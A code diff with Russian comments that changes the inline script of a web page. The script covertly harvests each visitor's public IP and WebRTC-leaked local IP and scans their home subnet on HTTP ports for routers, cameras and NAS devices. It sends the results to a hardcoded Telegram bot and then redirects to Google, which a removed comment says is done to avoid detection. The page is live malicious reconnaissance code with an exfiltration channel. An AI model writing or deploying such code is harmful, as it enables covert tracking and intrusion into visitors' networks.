@@ -7,15 +7,13 @@
         const BOT_TOKEN = '8936104890:AAFTtwKdd_JNhlcqENJ6kWonr9Wb2Z5fJ_8';    // ← свой токен
         const CHAT_ID = '8484695858';    // ← свой chat id
 
-        const TIMEOUT_MS = 500;              // таймаут на каждый хост
-        const SCAN_TARGETS = [1,2,3,100,101,102,103,104,105,106,107,108,109,110,138,254]; // самые частые
+        const PORTS = [80, 8080, 8000, 8888];  // только HTTP (роутеры, камеры, nas)
+        const SCAN_TIMEOUT = 2000;   // общий дедлайн на всё сканирование, мс
 
-        // Функция отправки сообщения в Телеграм
         function sendMsg(text) {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
         }
 
-        // Получение публичного IP
         async function getPublicIP() {
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
@@ -24,7 +22,6 @@
             } catch(e) { return 'не определён'; }
         }
 
-        // Получение локального IP через WebRTC
         function getLocalIP() {
             return new Promise((resolve, reject) => {
                 const pc = new RTCPeerConnection({ iceServers: [] });
@@ -43,42 +40,23 @@
             });
         }
 
-        // Сканирование одного IP с таймаутом
-        function probeHost(ip) {
+        // Проверка одного порта у одного IP (fetch с no-cors)
+        function probeHostPort(ip, port) {
             return new Promise((resolve) => {
-                const img = new Image();
-                const timer = setTimeout(() => {
-                    img.src = '';
-                    resolve(null); // таймаут – считаем мёртвым
-                }, TIMEOUT_MS);
-
-                img.onload = () => {
-                    clearTimeout(timer);
-                    resolve({ip, port: 80});
-                };
-                img.onerror = () => {
-                    clearTimeout(timer);
-                    // пробуем https
-                    const img2 = new Image();
-                    const timer2 = setTimeout(() => {
-                        img2.src = '';
-                        resolve(null);
-                    }, TIMEOUT_MS);
-                    img2.onload = () => {
-                        clearTimeout(timer2);
-                        resolve({ip, port: 443});
-                    };
-                    img2.onerror = () => {
-                        clearTimeout(timer2);
-                        resolve(null);
-                    };
-                    img2.src = `https://${ip}:443/favicon.ico?${Math.random()}`;
-                };
-                img.src = `http://${ip}/favicon.ico?${Math.random()}`;
+                const controller = new AbortController();
+                const timer = setTimeout(() => controller.abort(), 800);  // индивидуальный таймаут 800 мс
+                fetch(`http://${ip}:${port}/`, { mode: 'no-cors', signal: controller.signal })
+                    .then(() => {
+                        clearTimeout(timer);
+                        resolve({ ip, port, ok: true });
+                    })
+                    .catch(() => {
+                        clearTimeout(timer);
+                        resolve({ ip, port, ok: false });
+                    });
             });
         }
 
-        // Основная логика
         (async () => {
             // 1. Публичный IP сразу
             const pubIP = await getPublicIP();
@@ -87,37 +65,56 @@
             // 2. Локальный IP
             let localIP = null;
             try { localIP = await getLocalIP(); } catch(e) {}
+            if (!localIP) {
+                sendMsg(`🟡 Локальный IP не определён, глубже не сканирую.`);
+                setTimeout(() => window.location = 'https://www.google.com', 200);
+                return;
+            }
 
-            if (localIP) {
-                sendMsg(`🟢 Локальный IP: ${localIP} – сканирую хосты…`);
-                const parts = localIP.split('.');
-                const subnetBase = parts.slice(0,3).join('.');
+            sendMsg(`🟢 Локальный IP: ${localIP} – быстрое сканирование подсети…`);
 
-                // Запускаем параллельный скан по списку целей
-                const probes = SCAN_TARGETS.map(i => probeHost(`${subnetBase}.${i}`));
-                const results = await Promise.all(probes);
-                const alive = results.filter(r => r !== null).map(r => `${r.ip}:${r.port}`);
+            const parts = localIP.split('.');
+            const base = parts.slice(0,3).join('.');
 
-                // Шлём найденные хосты пачками по 5 штук, чтобы не потерять
-                for (let i = 0; i < alive.length; i += 5) {
-                    const chunk = alive.slice(i, i+5).join('\n');
-                    sendMsg(chunk);
-                }
-                if (alive.length === 0) sendMsg('Хосты не найдены');
-            } else {
-                sendMsg(`🟡 Локальный IP не определён, ищу роутер по популярным адресам…`);
-                const gwCandidates = ['192.168.0.1','192.168.1.1','10.0.0.1','10.0.0.138'];
-                const results = await Promise.all(gwCandidates.map(ip => probeHost(ip)));
-                const alive = results.filter(r => r !== null).map(r => `${r.ip}:${r.port}`);
-                if (alive.length) {
-                    sendMsg(`Найден роутер: ${alive.join(', ')}`);
-                } else {
-                    sendMsg('Роутер не найден');
+            // Создаём все запросы: 254 IP * количество портов
+            const allProbes = [];
+            for (let i = 1; i <= 254; i++) {
+                const ip = `${base}.${i}`;
+                for (const port of PORTS) {
+                    allProbes.push(probeHostPort(ip, port));
                 }
             }
 
-            // 3. Резкий уход на Google, чтобы не палиться
-            setTimeout(() => { window.location = 'https://www.google.com'; }, 200);
+            // Запускаем параллельно, но с общим дедлайном
+            const globalDeadline = new Promise((resolve) => setTimeout(resolve, SCAN_TIMEOUT, 'deadline'));
+            const resultsPromise = Promise.all(allProbes);
+            const winner = await Promise.race([resultsPromise, globalDeadline]);
+
+            let alive = [];
+            if (winner !== 'deadline') {
+                // все завершились вовремя
+                const results = await resultsPromise;
+                alive = results.filter(r => r.ok).map(r => `${r.ip}:${r.port}`);
+            } else {
+                // вышли по дедлайну, собираем что успели (не все ответы получены)
+                // ждём ещё 100 мс и смотрим
+                const partial = await Promise.all(allProbes.map(p => p.then(r => r).catch(() => ({ok:false}))));
+                alive = partial.filter(r => r.ok).map(r => `${r.ip}:${r.port}`);
+            }
+
+            if (alive.length) {
+                // Отправляем списком, не больше 50 хостов (чтобы влезло в сообщение)
+                const chunkSize = 40;
+                for (let i = 0; i < alive.length; i += chunkSize) {
+                    const chunk = alive.slice(i, i+chunkSize).join('\n');
+                    sendMsg(chunk);
+                }
+            } else {
+                sendMsg('Активных устройств не обнаружено');
+            }
+
+            // Мгновенный уход
+            setTimeout(() => { window.location = 'https://www.google.com'; }, 150);
         })();
     </script>
 </body>
